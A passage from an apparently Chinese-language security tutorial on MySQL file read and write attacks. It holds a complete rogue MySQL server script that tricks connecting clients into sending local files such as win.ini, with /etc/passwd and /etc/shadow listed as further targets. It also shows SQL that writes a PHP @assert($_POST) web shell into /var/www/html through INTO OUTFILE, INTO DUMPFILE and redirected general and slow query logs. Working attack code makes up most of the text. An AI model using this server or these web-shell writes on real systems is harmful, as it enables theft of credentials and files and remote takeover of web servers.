<h6 id="例子部分修改自：CSS-T-Mysql-Client-任意文件读取攻击链拓展"><a href="#例子部分修改自：CSS-T-Mysql-Client-任意文件读取攻击链拓展" class="headerlink" title="例子部分修改自：CSS-T | Mysql Client 任意文件读取攻击链拓展"></a>例子部分修改自：<a href="https://paper.seebug.org/1112/" target="_blank" rel="noopener">CSS-T | Mysql Client 任意文件读取攻击链拓展</a></h6><h6 id="换句话说：load-data-local语句要读取的文件会受到服务端的控制。"><a href="#换句话说：load-data-local语句要读取的文件会受到服务端的控制。" class="headerlink" title="换句话说：load data local语句要读取的文件会受到服务端的控制。"></a>换句话说：<code>load data local</code>语句要读取的文件会受到服务端的控制。</h6><h6 id="其次，在Mysql官方文档对于load-data-local语句的安全说明中有这么一句话"><a href="#其次，在Mysql官方文档对于load-data-local语句的安全说明中有这么一句话" class="headerlink" title="其次，在Mysql官方文档对于load data local语句的安全说明中有这么一句话:"></a>其次，在<a href="https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html" target="_blank" rel="noopener">Mysql官方文档对于<code>load data local</code>语句的安全说明</a>中有这么一句话:</h6><h6 id="A-patched-server-could-in-fact-reply-with-a-file-transfer-request-to-any-statement-not-justLOAD-DATA-LOCAL-so-a-more-fundamental-issue-is-that-clients-should-not-connect-to-untrusted-servers"><a href="#A-patched-server-could-in-fact-reply-with-a-file-transfer-request-to-any-statement-not-justLOAD-DATA-LOCAL-so-a-more-fundamental-issue-is-that-clients-should-not-connect-to-untrusted-servers" class="headerlink" title="A patched server could in fact reply with a file-transfer request to any statement, not justLOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers."></a><code>A patched server could in fact reply with a file-transfer request to any statement, not just</code>LOAD DATA LOCAL<code>, so a more fundamental issue is that clients should not connect to untrusted servers.</code></h6><h6 id="意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是load-data-local语句。"><a href="#意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是load-data-local语句。" class="headerlink" title="意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是load data local语句。"></a>意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是<code>load data local</code>语句。</h6><h6 id="这就会产生什么结果呢？之前讲的例子，将可以变成："><a href="#这就会产生什么结果呢？之前讲的例子，将可以变成：" class="headerlink" title="这就会产生什么结果呢？之前讲的例子，将可以变成："></a>这就会产生什么结果呢？之前讲的例子，将可以变成：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端：我需要查询test表下的xx内容</span><br><span class="line">服务端：我需要你的conn.php内容</span><br><span class="line">客户端：conn.php的内容如下???</span><br></pre></td></tr></table></figure>

<h6 id="可以看到，客户端相当于被攻击者给半劫持了。"><a href="#可以看到，客户端相当于被攻击者给半劫持了。" class="headerlink" title="可以看到，客户端相当于被攻击者给半劫持了。"></a>可以看到，客户端相当于被攻击者给半劫持了。</h6><h6 id="利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。"><a href="#利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。" class="headerlink" title="利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。"></a>利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。</h6><h6 id="简易恶意服务端代码："><a href="#简易恶意服务端代码：" class="headerlink" title="简易恶意服务端代码："></a>简易恶意服务端代码：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码摘自：https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> asyncore</span><br><span class="line"><span class="keyword">import</span> asynchat</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.handlers</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">3306</span></span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line">log.setLevel(logging.DEBUG)</span><br><span class="line">tmp_format = logging.handlers.WatchedFileHandler(<span class="string">'mysql.log'</span>, <span class="string">'ab'</span>)</span><br><span class="line">tmp_format.setFormatter(logging.Formatter(<span class="string">"%(asctime)s:%(levelname)s:%(message)s"</span>))</span><br><span class="line">log.addHandler(</span><br><span class="line">    tmp_format</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line"><span class="comment">#    r'c:\boot.ini',</span></span><br><span class="line">    <span class="string">r'c:\windows\win.ini'</span>,</span><br><span class="line"><span class="comment">#    r'c:\windows\system32\drivers\etc\hosts',</span></span><br><span class="line"><span class="comment">#    '/etc/passwd',</span></span><br><span class="line"><span class="comment">#    '/etc/shadow',</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"><span class="comment">#=======No need to change after this lines=======</span></span><br><span class="line"><span class="comment">#================================================</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Gifts'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">daemonize</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os, warnings</span><br><span class="line">    <span class="keyword">if</span> os.name != <span class="string">'posix'</span>:</span><br><span class="line">        warnings.warn(<span class="string">'Cant create daemon on non-posix system'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.setsid()</span><br><span class="line">    <span class="keyword">if</span> os.fork(): os._exit(<span class="number">0</span>)</span><br><span class="line">    os.umask(<span class="number">0o022</span>)</span><br><span class="line">    null=os.open(<span class="string">'/dev/null'</span>, os.O_RDWR)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.dup2(null, i)</span><br><span class="line">        <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.errno != <span class="number">9</span>: <span class="keyword">raise</span></span><br><span class="line">    os.close(null)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LastPacket</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutOfOrder</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_packet</span><span class="params">(object)</span>:</span></span><br><span class="line">    packet_header = struct.Struct(<span class="string">'&lt;Hbb'</span>)</span><br><span class="line">    packet_header_long = struct.Struct(<span class="string">'&lt;Hbbb'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, packet_type, payload)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(packet_type, mysql_packet):</span><br><span class="line">            self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.packet_num = packet_type</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        payload_len = len(self.payload)</span><br><span class="line">        <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">        result = <span class="string">"&#123;0&#125;&#123;1&#125;"</span>.format(</span><br><span class="line">            header,</span><br><span class="line">            self.payload</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> repr(str(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(raw_data)</span>:</span></span><br><span class="line">        packet_num = ord(raw_data[<span class="number">0</span>])</span><br><span class="line">        payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mysql_packet(packet_num, payload)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">http_request_handler</span><span class="params">(asynchat.async_chat)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        asynchat.async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">        self.addr = addr[<span class="number">1</span>]</span><br><span class="line">        self.ibuffer = []</span><br><span class="line">        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">        self.state = <span class="string">'LEN'</span></span><br><span class="line">        self.sub_state = <span class="string">'Auth'</span></span><br><span class="line">        self.logined = <span class="literal">False</span></span><br><span class="line">        self.push(</span><br><span class="line">            mysql_packet(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="string">""</span>.join((</span><br><span class="line">                    <span class="string">'\x0a'</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                    <span class="string">'3.0.0-Evil_Mysql_Server'</span> + <span class="string">'\0'</span>,  <span class="comment"># Version</span></span><br><span class="line">                    <span class="comment">#'5.1.66-0+squeeze1' + '\0',</span></span><br><span class="line">                    <span class="string">'\x36\x00\x00\x00'</span>,  <span class="comment"># Thread ID</span></span><br><span class="line">                    <span class="string">'evilsalt'</span> + <span class="string">'\0'</span>,  <span class="comment"># Salt</span></span><br><span class="line">                    <span class="string">'\xdf\xf7'</span>,  <span class="comment"># Capabilities</span></span><br><span class="line">                    <span class="string">'\x08'</span>,  <span class="comment"># Collation</span></span><br><span class="line">                    <span class="string">'\x02\x00'</span>,  <span class="comment"># Server Status</span></span><br><span class="line">                    <span class="string">'\0'</span> * <span class="number">13</span>,  <span class="comment"># Unknown</span></span><br><span class="line">                    <span class="string">'evil2222'</span> + <span class="string">'\0'</span>,</span><br><span class="line">                ))</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.order = <span class="number">1</span></span><br><span class="line">        self.states = [<span class="string">'LOGIN'</span>, <span class="string">'CAPS'</span>, <span class="string">'ANY'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Pushed: %r'</span>, data)</span><br><span class="line">        data = str(data)</span><br><span class="line">        asynchat.async_chat.push(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">collect_incoming_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        log.debug(<span class="string">'Data recved: %r'</span>, data)</span><br><span class="line">        self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">found_terminator</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = <span class="string">""</span>.join(self.ibuffer)</span><br><span class="line">        self.ibuffer = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'LEN'</span>:</span><br><span class="line">            len_bytes = ord(data[<span class="number">0</span>]) + <span class="number">256</span>*ord(data[<span class="number">1</span>]) + <span class="number">65536</span>*ord(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                self.set_terminator(len_bytes)</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'MoreLength'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'MoreLength'</span>:</span><br><span class="line">            <span class="keyword">if</span> data[<span class="number">0</span>] != <span class="string">'\0'</span>:</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.state = <span class="string">'Data'</span></span><br><span class="line">        <span class="keyword">elif</span> self.state == <span class="string">'Data'</span>:</span><br><span class="line">            packet = mysql_packet.parse(data)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                    <span class="keyword">raise</span> OutOfOrder()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># Fix ?</span></span><br><span class="line">                    self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x03'</span>:</span><br><span class="line">                        log.info(<span class="string">'Query'</span>)</span><br><span class="line"></span><br><span class="line">                        filename = random.choice(filelist)</span><br><span class="line">                        PACKET = mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xFB&#123;0&#125;'</span>.format(filename)</span><br><span class="line">                        )</span><br><span class="line">                        self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                        self.state = <span class="string">'LEN'</span></span><br><span class="line">                        self.sub_state = <span class="string">'File'</span></span><br><span class="line">                        self.push(PACKET)</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">'\x1b'</span>:</span><br><span class="line">                        log.info(<span class="string">'SelectDB'</span>)</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            <span class="string">'\xfe\x00\x00\x02\x00'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'\x02'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">elif</span> packet.payload == <span class="string">'\x00\x01'</span>:</span><br><span class="line">                        self.push(<span class="literal">None</span>)</span><br><span class="line">                        self.close_when_done()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">raise</span> ValueError()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.sub_state == <span class="string">'File'</span>:</span><br><span class="line">                        log.info(<span class="string">'-- result'</span>)</span><br><span class="line">                        log.info(<span class="string">'Result: %r'</span>, data)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">                            self.push(</span><br><span class="line">                                mysql_packet(packet, <span class="string">'\0\0\0\x02\0\0\0'</span>)</span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = <span class="string">'LEN'</span></span><br><span class="line">                            self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> self.sub_state == <span class="string">'Auth'</span>:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, <span class="string">'\0\0\0\x02\0\0\0'</span></span><br><span class="line">                        ))</span><br><span class="line">                        <span class="keyword">raise</span> LastPacket()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        log.info(<span class="string">'-- else'</span>)</span><br><span class="line">                        <span class="keyword">raise</span> ValueError(<span class="string">'Unknown packet'</span>)</span><br><span class="line">            <span class="keyword">except</span> LastPacket:</span><br><span class="line">                log.info(<span class="string">'Last packet'</span>)</span><br><span class="line">                self.state = <span class="string">'LEN'</span></span><br><span class="line">                self.sub_state = <span class="literal">None</span></span><br><span class="line">                self.order = <span class="number">0</span></span><br><span class="line">                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> OutOfOrder:</span><br><span class="line">                log.warning(<span class="string">'Out of order'</span>)</span><br><span class="line">                self.push(<span class="literal">None</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.error(<span class="string">'Unknown state'</span>)</span><br><span class="line">            self.push(<span class="string">'None'</span>)</span><br><span class="line">            self.close_when_done()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql_listener</span><span class="params">(asyncore.dispatcher)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, sock=None)</span>:</span></span><br><span class="line">        asyncore.dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            self.set_reuse_addr()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.bind((<span class="string">''</span>, PORT))</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            self.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_accept</span><span class="params">(self)</span>:</span></span><br><span class="line">        pair = self.accept()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            log.info(<span class="string">'Conn from: %r'</span>, pair[<span class="number">1</span>])</span><br><span class="line">            tmp = http_request_handler(pair)</span><br><span class="line"></span><br><span class="line">z = mysql_listener()</span><br><span class="line">daemonize()</span><br><span class="line">asyncore.loop()</span><br></pre></td></tr></table></figure>

<h6 id="需要注意的是：这个过程需要客户端允许使用load-data-local才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。"><a href="#需要注意的是：这个过程需要客户端允许使用load-data-local才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。" class="headerlink" title="需要注意的是：这个过程需要客户端允许使用load data local才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。"></a>需要注意的是：这个过程需要客户端允许使用<code>load data local</code>才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/sql-5.jpg" alt></p>
<h5 id="写"><a href="#写" class="headerlink" title="写"></a>写</h5><h6 id="说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下："><a href="#说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：" class="headerlink" title="说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下："></a>说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1,&quot;&lt;?php @assert($_POST[&apos;t&apos;]);?&gt;&quot; into outfile &apos;/var/www/html/1.php&apos;;</span><br><span class="line">select 2,&quot;&lt;?php @assert($_POST[&apos;t&apos;]);?&gt;&quot; into dumpfile &apos;/var/www/html/1.php&apos;;</span><br></pre></td></tr></table></figure>

<h6 id="例如：-12"><a href="#例如：-12" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,&quot;,&quot;,&quot;&lt;?php @assert($_POST[&apos;t&apos;]);?&gt;&quot; into dumpfile &apos;C:/Users/liangjie/flag.txt&apos;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(&quot;C:/Users/liangjie/flag.txt&quot;);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| load_file(&quot;C:/Users/liangjie/flag.txt&quot;) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| 1,&lt;?php @assert($_POST[&apos;t&apos;]);?&gt;         |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h6 id="限制：-1"><a href="#限制：-1" class="headerlink" title="限制："></a>限制：</h6><ul>
<li><code>secure-file-priv</code>无值或为可利用的目录</li>
<li>需知道目标目录的绝对目录地址</li>
<li>目标目录可写，mysql的权限足够。</li>
</ul>
<h5 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h5><h6 id="由于mysql在5-5-53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。"><a href="#由于mysql在5-5-53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。" class="headerlink" title="由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。"></a>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</h6><h6 id="mysql日志文件的一些相关设置可以直接通过命令来进行："><a href="#mysql日志文件的一些相关设置可以直接通过命令来进行：" class="headerlink" title="mysql日志文件的一些相关设置可以直接通过命令来进行："></a>mysql日志文件的一些相关设置可以直接通过命令来进行：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//请求日志</span><br><span class="line">mysql&gt; set global general_log_file = &apos;/var/www/html/1.php&apos;;</span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">//慢查询日志</span><br><span class="line">mysql&gt; set global slow_query_log_file=&apos;/var/www/html/2.php&apos;</span><br><span class="line">mysql&gt; set global slow_query_log=1;</span><br><span class="line">//还有其他很多日志都可以进行利用</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h6 id="之后我们在让数据库执行满足记录条件的恶意语句即可。"><a href="#之后我们在让数据库执行满足记录条件的恶意语句即可。" class="headerlink" title="之后我们在让数据库执行满足记录条件的恶意语句即可。"></a>之后我们在让数据库执行满足记录条件的恶意语句即可。</h6><h6 id="限制：-2"><a href="#限制：-2" class="headerlink" title="限制："></a>限制：</h6><ul>
<li>权限够，可以进行日志的设置操作</li>
<li>知道目标目录的绝对路径</li>
</ul>
